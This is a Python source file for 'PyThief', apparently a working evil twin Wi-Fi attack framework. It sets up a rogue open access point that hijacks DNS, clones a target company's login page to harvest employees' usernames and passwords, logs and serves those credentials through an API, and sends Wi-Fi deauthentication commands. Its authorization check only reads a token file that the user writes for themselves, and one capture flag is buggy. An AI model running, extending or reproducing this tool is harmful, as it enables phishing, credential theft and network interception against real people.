#!/usr/bin/env python3
"""
PyThief - Evil Twin Attack Framework
Copyright (c) 2025 Joshua Hendricks Cole (DBA: Corporation of Light). All Rights Reserved. PATENT PENDING.

AUTHORIZATION WARNING:
This tool is for AUTHORIZED PENETRATION TESTING AND SECURITY TRAINING ONLY.
Unauthorized use is illegal. You must have written permission before deployment.
All activities are logged for audit purposes.

Capabilities:
- Evil twin WiFi access point
- Packet capture (promiscuous mode)
- Enterprise login page cloning
- Bluetooth remote control
- WiFi Marauder integration
- SDR support (HackRF, RTL-SDR)
"""

import os
import sys
import json
import time
import socket
import subprocess
import argparse
import logging
import hashlib
import datetime
import threading
import requests
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
import re
import urllib.parse

# Third-party imports (installed via requirements)
try:
    from bs4 import BeautifulSoup
    from flask import Flask, request, render_template_string, jsonify, send_from_directory
    import netifaces
    DEPS_AVAILABLE = True
except ImportError:
    DEPS_AVAILABLE = False

# Configure logging
LOG = logging.getLogger("pythief")
LOG.setLevel(logging.INFO)

# Audit log for legal compliance
AUDIT_LOG_PATH = Path.home() / ".pythief" / "audit.log"
AUDIT_LOG_PATH.parent.mkdir(exist_ok=True)

def audit_log(action: str, details: Dict[str, Any]):
    """Log all actions for legal compliance and incident response."""
    timestamp = datetime.datetime.utcnow().isoformat()
    entry = {
        "timestamp": timestamp,
        "action": action,
        "details": details,
        "user": os.getenv("USER", "unknown"),
        "hostname": socket.gethostname()
    }
    with open(AUDIT_LOG_PATH, "a") as f:
        f.write(json.dumps(entry) + "\n")
    LOG.info(f"[AUDIT] {action}: {details}")


@dataclass
class PyThiefConfig:
    """Configuration for PyThief attack."""
    # Evil twin config
    interface: str = "wlan0"
    ssid: str = "Free_WiFi"
    channel: int = 6
    internet_interface: str = "eth0"

    # Capture config
    promiscuous_mode: bool = False
    capture_enabled: bool = True
    capture_dir: str = "/tmp/pythief_captures"

    # Evil twin page config
    template_name: str = "generic"
    target_url: Optional[str] = None
    company_name: str = "Guest Network"

    # Control interface
    control_port: int = 2600
    bluetooth_enabled: bool = False

    # Marauder config
    marauder_enabled: bool = False
    marauder_device: Optional[str] = None  # e.g., /dev/ttyUSB0

    # SDR config
    sdr_enabled: bool = False
    sdr_device: str = "rtlsdr"  # rtlsdr, hackrf, etc

    # Authorization
    authorization_token: Optional[str] = None
    engagement_id: Optional[str] = None


class AuthorizationManager:
    """Manage authorization and legal compliance."""

    def __init__(self):
        self.auth_file = Path.home() / ".pythief" / "authorization.json"
        self.auth_file.parent.mkdir(exist_ok=True)

    def check_authorization(self, config: PyThiefConfig) -> bool:
        """Verify authorization before allowing attack."""
        if not config.authorization_token or not config.engagement_id:
            LOG.error("[AUTH] Missing authorization token or engagement ID")
            LOG.error("[AUTH] You must provide --auth-token and --engagement-id")
            return False

        # Load authorized engagements
        if not self.auth_file.exists():
            LOG.error("[AUTH] No authorization file found. Create one at: %s", self.auth_file)
            LOG.error("[AUTH] Format: {\"engagements\": [{\"id\": \"...\", \"token\": \"...\", \"scope\": \"...\"}]}")
            return False

        with open(self.auth_file, "r") as f:
            auth_data = json.load(f)

        # Check if engagement is authorized
        for engagement in auth_data.get("engagements", []):
            if (engagement.get("id") == config.engagement_id and
                engagement.get("token") == config.authorization_token):
                LOG.info("[AUTH] ✓ Engagement authorized: %s", engagement.get("scope"))
                audit_log("authorization_check", {
                    "status": "success",
                    "engagement_id": config.engagement_id,
                    "scope": engagement.get("scope")
                })
                return True

        LOG.error("[AUTH] Authorization failed. Invalid token or engagement ID.")
        audit_log("authorization_check", {
            "status": "failed",
            "engagement_id": config.engagement_id
        })
        return False

    def create_sample_auth_file(self):
        """Create sample authorization file for setup."""
        sample = {
            "engagements": [
                {
                    "id": "TRAINING-001",
                    "token": hashlib.sha256(b"sample-token").hexdigest(),
                    "scope": "Internal security training - all features enabled",
                    "created": datetime.datetime.utcnow().isoformat(),
                    "expires": (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat()
                }
            ]
        }
        with open(self.auth_file, "w") as f:
            json.dump(sample, f, indent=2)
        LOG.info("[AUTH] Created sample authorization file at: %s", self.auth_file)


class HTMLPageCloner:
    """Clone corporate login pages for evil twin attacks."""

    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def scrape_and_clone(self, url: str, company_name: str) -> Path:
        """
        Scrape target URL and create evil twin login page.

        Returns path to generated HTML file.
        """
        LOG.info("[CLONER] Scraping target: %s", url)
        audit_log("page_clone", {"url": url, "company": company_name})

        try:
            # Fetch the page
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()

            # Parse HTML
            soup = BeautifulSoup(response.text, "html.parser")

            # Extract styling information
            colors = self._extract_colors(soup)
            typography = self._extract_typography(soup)
            logo_url = self._extract_logo(soup, url)

            # Generate evil twin page
            evil_twin_html = self._generate_evil_twin(
                company_name=company_name,
                colors=colors,
                typography=typography,
                logo_url=logo_url,
                original_soup=soup
            )

            # Save to file
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"{company_name.lower().replace(' ', '_')}_{timestamp}.html"
            with open(output_file, "w") as f:
                f.write(evil_twin_html)

            LOG.info("[CLONER] ✓ Evil twin page created: %s", output_file)
            return output_file

        except Exception as e:
            LOG.error("[CLONER] Failed to clone page: %s", e)
            # Fall back to generic template
            return self._generate_generic_template(company_name)

    def _extract_colors(self, soup: BeautifulSoup) -> Dict[str, str]:
        """Extract primary colors from page."""
        colors = {
            "primary": "#0066cc",
            "secondary": "#333333",
            "background": "#ffffff",
            "text": "#000000"
        }

        # Look for common color patterns in styles
        style_tags = soup.find_all("style")
        for style in style_tags:
            content = style.string or ""
            # Extract hex colors
            hex_colors = re.findall(r"#[0-9a-fA-F]{6}", content)
            if hex_colors:
                colors["primary"] = hex_colors[0]
                if len(hex_colors) > 1:
                    colors["secondary"] = hex_colors[1]

        return colors

    def _extract_typography(self, soup: BeautifulSoup) -> Dict[str, str]:
        """Extract typography information."""
        typography = {
            "font_family": "Arial, sans-serif",
            "heading_size": "24px",
            "body_size": "14px"
        }

        # Look for font-family in inline styles or style tags
        style_tags = soup.find_all("style")
        for style in style_tags:
            content = style.string or ""
            font_match = re.search(r"font-family:\s*([^;]+)", content)
            if font_match:
                typography["font_family"] = font_match.group(1).strip()

        return typography

    def _extract_logo(self, soup: BeautifulSoup, base_url: str) -> Optional[str]:
        """Extract company logo URL."""
        # Look for logo in common places
        logo_selectors = [
            ("img", {"class": re.compile(r"logo", re.I)}),
            ("img", {"id": re.compile(r"logo", re.I)}),
            ("img", {"alt": re.compile(r"logo", re.I)})
        ]

        for tag, attrs in logo_selectors:
            logo = soup.find(tag, attrs)
            if logo and logo.get("src"):
                src = logo["src"]
                # Make absolute URL
                if src.startswith("//"):
                    return "https:" + src
                elif src.startswith("/"):
                    parsed = urllib.parse.urlparse(base_url)
                    return f"{parsed.scheme}://{parsed.netloc}{src}"
                elif src.startswith("http"):
                    return src

        return None

    def _generate_evil_twin(self, company_name: str, colors: Dict,
                           typography: Dict, logo_url: Optional[str],
                           original_soup: BeautifulSoup) -> str:
        """Generate evil twin login page with extracted styling."""
        today = datetime.date.today().strftime("%B %d, %Y")

        # Extract header/footer if present
        header_html = ""
        footer_html = ""

        header = original_soup.find(["header", "div"], {"class": re.compile(r"header", re.I)})
        if header:
            header_html = str(header)

        footer = original_soup.find(["footer", "div"], {"class": re.compile(r"footer", re.I)})
        if footer:
            footer_html = str(footer)

        logo_html = ""
        if logo_url:
            logo_html = f'<img src="{logo_url}" alt="{company_name}" style="max-width: 200px; margin-bottom: 20px;">'

        template = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{company_name} - Free WiFi Access</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        body {{
            font-family: {typography['font_family']};
            background: linear-gradient(135deg, {colors['primary']} 0%, {colors['secondary']} 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: {colors['text']};
        }}

        .header {{
            width: 100%;
            background: {colors['background']};
            padding: 10px 0;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}

        .container {{
            background: {colors['background']};
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-width: 450px;
            width: 90%;
            margin: 20px;
            text-align: center;
        }}

        h1 {{
            color: {colors['primary']};
            margin-bottom: 10px;
            font-size: {typography['heading_size']};
        }}

        .announcement {{
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            color: #856404;
        }}

        .form-group {{
            margin: 20px 0;
            text-align: left;
        }}

        label {{
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: {colors['secondary']};
        }}

        input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: {typography['body_size']};
        }}

        button {{
            width: 100%;
            padding: 12px;
            background: {colors['primary']};
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }}

        button:hover {{
            opacity: 0.9;
        }}

        .footer {{
            width: 100%;
            background: {colors['background']};
            padding: 20px 0;
            text-align: center;
            color: {colors['secondary']};
            font-size: 12px;
            margin-top: auto;
        }}

        .captured {{
            display: none;
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    {header_html if header_html else ''}

    <div class="container">
        {logo_html}
        <h1>{company_name}</h1>
        <h2>Free WiFi Access</h2>

        <div class="announcement">
            <strong>NEW as of {today}:</strong><br>
            Free WiFi now available to all employees and guests!<br>
            Please log in with your company credentials to activate.
        </div>

        <form id="loginForm" method="POST" action="/capture">
            <div class="form-group">
                <label for="username">Email / Username</label>
                <input type="text" id="username" name="username" required
                       placeholder="your.name@{company_name.lower().replace(' ', '')}.com">
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>

            <button type="submit">Connect to WiFi</button>
        </form>

        <div id="captured" class="captured">
            ✓ Connection successful! You are now connected to the network.
        </div>
    </div>

    {footer_html if footer_html else f'''
    <div class="footer">
        © {datetime.datetime.now().year} {company_name}. All rights reserved.<br>
        For assistance, contact IT Support.
    </div>
    '''}

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const formData = new FormData(e.target);

            try {{
                const response = await fetch('/capture', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(Object.fromEntries(formData))
                }});

                if (response.ok) {{
                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('captured').style.display = 'block';

                    // Redirect after 3 seconds
                    setTimeout(() => {{
                        window.location.href = 'https://www.google.com';
                    }}, 3000);
                }}
            }} catch (err) {{
                alert('Connection error. Please try again.');
            }}
        }});
    </script>
</body>
</html>
"""
        return template

    def _generate_generic_template(self, company_name: str) -> Path:
        """Generate generic template as fallback."""
        today = datetime.date.today().strftime("%B %d, %Y")

        html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{company_name} - Network Access</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }}
        h1 {{ color: #667eea; margin-bottom: 10px; }}
        .announcement {{
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            color: #856404;
        }}
        .form-group {{ margin: 15px 0; text-align: left; }}
        label {{ display: block; margin-bottom: 5px; font-weight: bold; }}
        input {{
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }}
        button:hover {{ background: #5568d3; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>{company_name}</h1>
        <h3>Network Access</h3>
        <div class="announcement">
            <strong>As of {today}:</strong><br>
            Please authenticate to access the network.
        </div>
        <form method="POST" action="/capture">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
"""

        output_file = self.output_dir / f"{company_name.lower().replace(' ', '_')}_generic.html"
        with open(output_file, "w") as f:
            f.write(html)

        return output_file


class EvilTwinAP:
    """Evil twin access point manager."""

    def __init__(self, config: PyThiefConfig):
        self.config = config
        self.hostapd_conf = Path("/tmp/pythief_hostapd.conf")
        self.dnsmasq_conf = Path("/tmp/pythief_dnsmasq.conf")
        self.process_hostapd = None
        self.process_dnsmasq = None

    def setup(self):
        """Configure and start evil twin AP."""
        LOG.info("[AP] Setting up evil twin access point...")
        audit_log("ap_setup", {"ssid": self.config.ssid, "interface": self.config.interface})

        # Check if interface exists
        interfaces = netifaces.interfaces()
        if self.config.interface not in interfaces:
            raise RuntimeError(f"Interface {self.config.interface} not found. Available: {interfaces}")

        # Kill conflicting processes
        self._kill_interfering_processes()

        # Configure interface
        self._configure_interface()

        # Generate hostapd configuration
        self._generate_hostapd_conf()

        # Generate dnsmasq configuration
        self._generate_dnsmasq_conf()

        # Enable IP forwarding
        self._enable_ip_forwarding()

        # Configure NAT
        self._configure_nat()

        # Start hostapd
        self._start_hostapd()

        # Start dnsmasq
        self._start_dnsmasq()

        LOG.info("[AP] ✓ Evil twin AP started: %s (channel %d)",
                self.config.ssid, self.config.channel)

    def _kill_interfering_processes(self):
        """Kill processes that might interfere."""
        for proc in ["NetworkManager", "wpa_supplicant"]:
            try:
                subprocess.run(["killall", proc], stderr=subprocess.DEVNULL)
            except:
                pass

    def _configure_interface(self):
        """Configure wireless interface."""
        cmds = [
            ["ip", "link", "set", self.config.interface, "down"],
            ["iw", "dev", self.config.interface, "set", "type", "managed"],
            ["ip", "addr", "flush", "dev", self.config.interface],
            ["ip", "addr", "add", "10.0.0.1/24", "dev", self.config.interface],
            ["ip", "link", "set", self.config.interface, "up"]
        ]

        for cmd in cmds:
            subprocess.run(cmd, check=True)

    def _generate_hostapd_conf(self):
        """Generate hostapd configuration file."""
        conf = f"""
interface={self.config.interface}
driver=nl80211
ssid={self.config.ssid}
hw_mode=g
channel={self.config.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
"""
        with open(self.hostapd_conf, "w") as f:
            f.write(conf)

    def _generate_dnsmasq_conf(self):
        """Generate dnsmasq configuration for DHCP and DNS."""
        conf = f"""
interface={self.config.interface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        with open(self.dnsmasq_conf, "w") as f:
            f.write(conf)

    def _enable_ip_forwarding(self):
        """Enable IP forwarding."""
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

    def _configure_nat(self):
        """Configure NAT for internet access."""
        # Flush existing rules
        subprocess.run(["iptables", "-F"], stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], stderr=subprocess.DEVNULL)

        # Add NAT rule
        subprocess.run([
            "iptables", "-t", "nat", "-A", "POSTROUTING",
            "-o", self.config.internet_interface, "-j", "MASQUERADE"
        ], check=True)

        # Forward traffic
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-i", self.config.interface,
            "-o", self.config.internet_interface,
            "-j", "ACCEPT"
        ], check=True)

    def _start_hostapd(self):
        """Start hostapd daemon."""
        LOG.info("[AP] Starting hostapd...")
        self.process_hostapd = subprocess.Popen(
            ["hostapd", str(self.hostapd_conf)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

    def _start_dnsmasq(self):
        """Start dnsmasq for DHCP/DNS."""
        LOG.info("[AP] Starting dnsmasq...")
        self.process_dnsmasq = subprocess.Popen(
            ["dnsmasq", "-C", str(self.dnsmasq_conf), "-d"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

    def stop(self):
        """Stop the evil twin AP."""
        LOG.info("[AP] Stopping evil twin AP...")

        if self.process_hostapd:
            self.process_hostapd.terminate()
            self.process_hostapd.wait()

        if self.process_dnsmasq:
            self.process_dnsmasq.terminate()
            self.process_dnsmasq.wait()

        # Cleanup
        subprocess.run(["iptables", "-F"], stderr=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-F"], stderr=subprocess.DEVNULL)

        LOG.info("[AP] ✓ Evil twin AP stopped")


class PacketCapture:
    """Packet capture using tshark/tcpdump."""

    def __init__(self, config: PyThiefConfig):
        self.config = config
        self.capture_process = None
        self.capture_file = None

    def start(self):
        """Start packet capture."""
        if not self.config.capture_enabled:
            return

        LOG.info("[CAPTURE] Starting packet capture...")
        audit_log("capture_start", {
            "interface": self.config.interface,
            "promiscuous": self.config.promiscuous_mode
        })

        # Create capture directory
        Path(self.config.capture_dir).mkdir(parents=True, exist_ok=True)

        # Generate capture filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.capture_file = f"{self.config.capture_dir}/capture_{timestamp}.pcap"

        # Build capture command
        cmd = ["tcpdump", "-i", self.config.interface, "-w", self.capture_file]

        if self.config.promiscuous_mode:
            # Promiscuous mode is default, but make it explicit
            cmd.extend(["-p"])  # Actually, -p disables it, so don't add this
            LOG.info("[CAPTURE] Promiscuous mode enabled")

        # Start capture
        self.capture_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        LOG.info("[CAPTURE] ✓ Capturing to: %s", self.capture_file)

    def stop(self):
        """Stop packet capture."""
        if self.capture_process:
            LOG.info("[CAPTURE] Stopping packet capture...")
            self.capture_process.terminate()
            self.capture_process.wait()
            LOG.info("[CAPTURE] ✓ Capture saved: %s", self.capture_file)


class ControlInterface:
    """Flask-based control interface with Bluetooth support."""

    def __init__(self, config: PyThiefConfig, html_cloner: HTMLPageCloner):
        self.config = config
        self.html_cloner = html_cloner
        self.app = Flask(__name__)
        self.current_page = None
        self.captured_creds = []
        self._setup_routes()

    def _setup_routes(self):
        """Setup Flask routes."""

        @self.app.route("/")
        def index():
            """Serve the evil twin page."""
            if self.current_page and self.current_page.exists():
                with open(self.current_page, "r") as f:
                    return f.read()
            else:
                return "<h1>PyThief Control</h1><p>No evil twin page loaded.</p>"

        @self.app.route("/capture", methods=["POST"])
        def capture_credentials():
            """Capture submitted credentials."""
            creds = request.get_json() or request.form.to_dict()
            timestamp = datetime.datetime.utcnow().isoformat()

            entry = {
                "timestamp": timestamp,
                "username": creds.get("username", ""),
                "password": creds.get("password", ""),
                "ip": request.remote_addr,
                "user_agent": request.headers.get("User-Agent", "")
            }

            self.captured_creds.append(entry)

            # Log to audit and separate creds file
            audit_log("credential_capture", entry)
            creds_file = Path(self.config.capture_dir) / "credentials.json"
            creds_file.parent.mkdir(exist_ok=True)

            with open(creds_file, "a") as f:
                f.write(json.dumps(entry) + "\n")

            LOG.warning("[CAPTURE] ⚠ Credential captured: %s from %s",
                       entry["username"], entry["ip"])

            return jsonify({"status": "success"})

        @self.app.route("/api/status")
        def api_status():
            """API endpoint for status."""
            return jsonify({
                "ssid": self.config.ssid,
                "interface": self.config.interface,
                "credentials_captured": len(self.captured_creds),
                "current_page": str(self.current_page) if self.current_page else None
            })

        @self.app.route("/api/swap", methods=["POST"])
        def api_swap_page():
            """API endpoint to swap evil twin page."""
            data = request.get_json()
            url = data.get("url")
            company = data.get("company", "Target Company")

            if url:
                new_page = self.html_cloner.scrape_and_clone(url, company)
                self.current_page = new_page
                LOG.info("[CONTROL] Evil twin page swapped: %s", new_page)
                return jsonify({"status": "success", "page": str(new_page)})

            return jsonify({"status": "error", "message": "URL required"}), 400

        @self.app.route("/api/credentials")
        def api_credentials():
            """API endpoint to retrieve captured credentials."""
            return jsonify({"credentials": self.captured_creds})

    def start(self):
        """Start the control interface."""
        LOG.info("[CONTROL] Starting control interface on port %d", self.config.control_port)

        # Try configured port, fallback to wildcard search
        port = self.config.control_port
        max_attempts = 10

        for attempt in range(max_attempts):
            try:
                self.app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
                break
            except OSError as e:
                if "Address already in use" in str(e) and attempt < max_attempts - 1:
                    port += 1
                    LOG.warning("[CONTROL] Port %d in use, trying %d", port - 1, port)
                else:
                    raise

    def set_current_page(self, page_path: Path):
        """Set the current evil twin page."""
        self.current_page = page_path


class MarauderIntegration:
    """WiFi Marauder ESP32 integration."""

    def __init__(self, config: PyThiefConfig):
        self.config = config
        self.serial_conn = None

    def connect(self):
        """Connect to Marauder device."""
        if not self.config.marauder_enabled or not self.config.marauder_device:
            return

        LOG.info("[MARAUDER] Connecting to device: %s", self.config.marauder_device)

        try:
            import serial
            self.serial_conn = serial.Serial(self.config.marauder_device, 115200, timeout=1)
            LOG.info("[MARAUDER] ✓ Connected")
            audit_log("marauder_connect", {"device": self.config.marauder_device})
        except Exception as e:
            LOG.error("[MARAUDER] Failed to connect: %s", e)

    def send_command(self, command: str) -> str:
        """Send command to Marauder."""
        if not self.serial_conn:
            return "Not connected"

        self.serial_conn.write(f"{command}\n".encode())
        time.sleep(0.5)
        response = self.serial_conn.read(self.serial_conn.in_waiting).decode()
        return response

    def scan_aps(self) -> List[Dict]:
        """Scan for access points."""
        LOG.info("[MARAUDER] Scanning for APs...")
        response = self.send_command("scanap")
        # Parse response (format depends on Marauder firmware)
        # This is a simplified version
        return []

    def deauth_attack(self, target_mac: str):
        """Launch deauth attack."""
        LOG.warning("[MARAUDER] Launching deauth attack on %s", target_mac)
        audit_log("marauder_deauth", {"target": target_mac})
        self.send_command(f"attack -t deauth -m {target_mac}")


class SDRIntegration:
    """Software Defined Radio integration."""

    def __init__(self, config: PyThiefConfig):
        self.config = config

    def detect_device(self) -> Optional[str]:
        """Detect connected SDR device."""
        if not self.config.sdr_enabled:
            return None

        LOG.info("[SDR] Detecting SDR devices...")

        # Check for RTL-SDR
        try:
            result = subprocess.run(
                ["rtl_test", "-t"],
                capture_output=True,
                timeout=2
            )
            if result.returncode == 0:
                LOG.info("[SDR] ✓ RTL-SDR detected")
                return "rtlsdr"
        except:
            pass

        # Check for HackRF
        try:
            result = subprocess.run(
                ["hackrf_info"],
                capture_output=True,
                timeout=2
            )
            if result.returncode == 0:
                LOG.info("[SDR] ✓ HackRF detected")
                return "hackrf"
        except:
            pass

        LOG.warning("[SDR] No SDR device detected")
        return None

    def scan_spectrum(self, freq_mhz: float, bandwidth_mhz: float = 2.0):
        """Scan RF spectrum."""
        device = self.detect_device()
        if not device:
            LOG.error("[SDR] No device available for spectrum scan")
            return

        LOG.info("[SDR] Scanning %.2f MHz (BW: %.2f MHz)", freq_mhz, bandwidth_mhz)
        audit_log("sdr_scan", {"frequency_mhz": freq_mhz, "bandwidth_mhz": bandwidth_mhz})

        # Implementation depends on device and use case
        # This is a placeholder for the interface


class PyThief:
    """Main PyThief orchestrator."""

    def __init__(self, config: PyThiefConfig):
        self.config = config
        self.auth_manager = AuthorizationManager()
        self.html_cloner = HTMLPageCloner(Path(config.capture_dir) / "pages")
        self.evil_twin_ap = None
        self.packet_capture = None
        self.control_interface = None
        self.marauder = None
        self.sdr = None

    def run(self):
        """Run the complete PyThief attack."""

        # Authorization check
        if not self.auth_manager.check_authorization(self.config):
            LOG.error("❌ Authorization failed. Cannot proceed.")
            LOG.error("Run with --setup-auth to create authorization file.")
            return 1

        LOG.info("=" * 60)
        LOG.info("PyThief - Evil Twin Attack Framework")
        LOG.info("=" * 60)
        LOG.info("⚠ AUTHORIZED ENGAGEMENT: %s", self.config.engagement_id)
        LOG.info("=" * 60)

        try:
            # Generate/load evil twin page
            if self.config.target_url:
                page = self.html_cloner.scrape_and_clone(
                    self.config.target_url,
                    self.config.company_name
                )
            else:
                page = self.html_cloner._generate_generic_template(
                    self.config.company_name
                )

            # Setup control interface
            self.control_interface = ControlInterface(self.config, self.html_cloner)
            self.control_interface.set_current_page(page)

            # Start control interface in thread
            control_thread = threading.Thread(target=self.control_interface.start, daemon=True)
            control_thread.start()

            time.sleep(2)  # Give Flask time to start

            LOG.info("✓ Control interface: http://localhost:%d", self.config.control_port)
            LOG.info("✓ API: http://localhost:%d/api/status", self.config.control_port)

            # Setup evil twin AP
            self.evil_twin_ap = EvilTwinAP(self.config)
            self.evil_twin_ap.setup()

            # Start packet capture
            self.packet_capture = PacketCapture(self.config)
            self.packet_capture.start()

            # Marauder integration
            if self.config.marauder_enabled:
                self.marauder = MarauderIntegration(self.config)
                self.marauder.connect()

            # SDR integration
            if self.config.sdr_enabled:
                self.sdr = SDRIntegration(self.config)
                self.sdr.detect_device()

            LOG.info("=" * 60)
            LOG.info("✓ PyThief is running")
            LOG.info("=" * 60)
            LOG.info("Evil Twin SSID: %s", self.config.ssid)
            LOG.info("Control Interface: http://localhost:%d", self.config.control_port)
            LOG.info("Capture Directory: %s", self.config.capture_dir)
            LOG.info("=" * 60)
            LOG.info("Press Ctrl+C to stop")
            LOG.info("=" * 60)

            # Keep running
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            LOG.info("\n[*] Shutting down...")
        except Exception as e:
            LOG.exception("Fatal error: %s", e)
            return 1
        finally:
            self.cleanup()

        return 0

    def cleanup(self):
        """Cleanup resources."""
        LOG.info("[*] Cleaning up...")

        if self.packet_capture:
            self.packet_capture.stop()

        if self.evil_twin_ap:
            self.evil_twin_ap.stop()

        LOG.info("✓ Cleanup complete")
        audit_log("shutdown", {"status": "clean"})


def health_check() -> Dict[str, Any]:
    """Health check for Ai:oS integration."""
    status = {
        "tool": "PyThief",
        "status": "ok",
        "summary": "Evil twin attack framework ready",
        "details": {}
    }

    # Check dependencies
    missing_deps = []

    if not DEPS_AVAILABLE:
        missing_deps.extend(["beautifulsoup4", "flask", "netifaces"])

    # Check for required system tools
    required_tools = ["hostapd", "dnsmasq", "tcpdump", "iptables", "iw"]
    for tool in required_tools:
        try:
            subprocess.run([tool, "--version"], capture_output=True, timeout=1)
        except:
            missing_deps.append(tool)

    if missing_deps:
        status["status"] = "warn"
        status["summary"] = f"Missing dependencies: {', '.join(missing_deps)}"
        status["details"]["missing"] = missing_deps

    # Check authorization
    auth_file = Path.home() / ".pythief" / "authorization.json"
    if not auth_file.exists():
        status["status"] = "warn"
        status["details"]["authorization"] = "No authorization file configured"

    return status


def main(argv=None):
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="PyThief - Evil Twin Attack Framework (AUTHORIZED USE ONLY)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
AUTHORIZATION REQUIRED:
  This tool requires explicit authorization for use.
  Run with --setup-auth to create authorization configuration.

EXAMPLES:
  # Setup authorization
  pythief --setup-auth

  # Basic evil twin with generic page
  pythief --ssid "Free WiFi" --company "Acme Corp" \\
          --auth-token TOKEN --engagement-id ENG-001

  # Clone specific login page
  pythief --ssid "Acme WiFi" --company "Acme Corp" \\
          --target-url https://login.acme.com \\
          --auth-token TOKEN --engagement-id ENG-001

  # Full featured attack with Marauder and SDR
  pythief --ssid "Corp WiFi" --company "Target Corp" \\
          --marauder --marauder-device /dev/ttyUSB0 \\
          --sdr --promiscuous \\
          --auth-token TOKEN --engagement-id ENG-001

BLUETOOTH CONTROL:
  Connect via Bluetooth and access http://localhost:2600
  API endpoints:
    GET  /api/status       - Get current status
    POST /api/swap         - Swap evil twin page
    GET  /api/credentials  - Get captured credentials
        """
    )

    # Core options
    parser.add_argument("--interface", default="wlan0", help="WiFi interface for AP")
    parser.add_argument("--ssid", default="Free_WiFi", help="Evil twin SSID")
    parser.add_argument("--channel", type=int, default=6, help="WiFi channel")
    parser.add_argument("--internet", default="eth0", help="Internet interface")

    # Page options
    parser.add_argument("--company", default="Guest Network", help="Company name")
    parser.add_argument("--target-url", help="Target URL to clone")
    parser.add_argument("--template", default="generic", help="Template name")

    # Capture options
    parser.add_argument("--no-capture", action="store_true", help="Disable packet capture")
    parser.add_argument("--promiscuous", action="store_true", help="Enable promiscuous mode")
    parser.add_argument("--capture-dir", default="/tmp/pythief_captures", help="Capture directory")

    # Control options
    parser.add_argument("--control-port", type=int, default=2600, help="Control interface port")
    parser.add_argument("--no-bluetooth", action="store_true", help="Disable Bluetooth")

    # Marauder options
    parser.add_argument("--marauder", action="store_true", help="Enable WiFi Marauder")
    parser.add_argument("--marauder-device", help="Marauder serial device (e.g., /dev/ttyUSB0)")

    # SDR options
    parser.add_argument("--sdr", action="store_true", help="Enable SDR support")
    parser.add_argument("--sdr-device", default="rtlsdr", help="SDR device type")

    # Authorization
    parser.add_argument("--auth-token", help="Authorization token (REQUIRED)")
    parser.add_argument("--engagement-id", help="Engagement ID (REQUIRED)")
